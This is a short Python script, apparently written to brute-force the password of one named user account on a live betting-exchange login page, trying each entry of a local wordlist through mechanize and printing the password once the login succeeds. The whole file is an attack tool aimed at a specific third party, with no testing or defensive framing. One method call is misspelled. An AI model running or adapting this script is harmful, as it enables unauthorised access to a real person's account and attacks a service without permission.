import mechanize

br = mechanize.Browser()

br.set_handle_eqiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)

br.open("http://www.diamondexch.com/m/login")

file = open("wordlist.txt", "r")
password = file.read().splitlines()
for x in password:
    br.select_form(nr= 0)
    br.form['username'] = "Sonu2839"
    br.form['password'] = x
    resp = br.submit()
    if resp.geturl() == "http://www.diamondexch.com/m/login":
        print("Incorrect Password " + x)
    else:
        print("Correct Password is " + x)
        break